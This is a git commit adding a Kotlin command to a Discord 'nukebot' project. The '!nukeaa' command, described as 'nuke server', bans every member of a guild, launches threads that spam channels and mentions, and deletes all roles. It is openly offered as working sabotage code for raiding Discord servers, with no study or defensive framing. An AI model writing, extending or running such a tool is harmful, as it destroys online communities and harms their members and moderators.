321ef135169ceb33ca52b1683d34df8af55f18aa
Eric101201 <s813554@csic.khc.edu.tw>
2022-03-15 22:02:54 +0800

    a ha

---
+++ src/main/kotlin/thenano/nukebot/bot/command/commands/nukeaa.kt
@@ -0,0 +1,66 @@
+package thenano.nukebot.bot.command.commands
+
+import net.dv8tion.jda.api.Permission
+import net.dv8tion.jda.api.events.message.MessageReceivedEvent
+import net.dv8tion.jda.api.exceptions.PermissionException
+import thenano.nukebot.bot.command.CommandListener
+import thenano.nukebot.bot.command.CommandManager
+import kotlin.jvm.Throws
+
+@CommandListener.Info("!nukeaa <tag(true/false) <channelName> <contents>","nuke server",false)
+class nukeaa : CommandListener() {
+
+    @Throws(RuntimeException::class)
+    override fun onMessageReceived(event: MessageReceivedEvent) {
+
+//BAN,del channel,del role,
+
+        if (message.contentRaw.startsWith("!nukeaa")) {
+            if (onInit(event)) return
+
+            if (guild.selfMember.hasPermission(Permission.BAN_MEMBERS))
+            {
+                loop1@ for (member in guild.members) {
+                    try {
+                        guild.ban(member, 1, "Server Nuked by 我好大").queue()
+                        println("Banned " + member.user.asTag)
+                    } catch (e: PermissionException) {
+                        println("Cannot ban " + member.user.asTag + "- PermissionException")
+                    }
+                    if (CommandManager.stop) break@loop1
+                }
+            }
+
+            if (self.hasPermission(Permission.MANAGE_CHANNEL,Permission.MANAGE_ROLES)) {
+                try {
+                    val index = messageRaw.indexOf(" ")
+                    val index2 = messageRaw.indexOf(" ", index + 1)
+                    val index3 = messageRaw.indexOf(" ",index2+ 1)
+                    val tag = messageRaw.substring(index + 1, index2).equals("true")
+                    val content = messageRaw.substring(index2 + 1,index3)
+                    val content2 = messageRaw.substring(index3+1)
+
+                    val channelThread = Thread(SpamChannel.ChannelThread(content))
+                    channelThread.start()
+                    if (tag) {
+                        for (i in 0..3) {
+                            val tagThread = Thread(SpamChannel.TagThread(content2))
+                            tagThread.start()
+                        }
+                    }
+
+                    for (role in guild.roles) {
+                        try {
+                            role.delete().complete()
+                            println("Deleted Role { name=" + role.name + " }")
+                        } catch (e: StringIndexOutOfBoundsException) {}
+
+                        println("Cannot Deleted Role { name=" + role.name + " }")
+                    }
+                } catch (e: StringIndexOutOfBoundsException) {}
+            }
+
+        }
+    }
+
+}
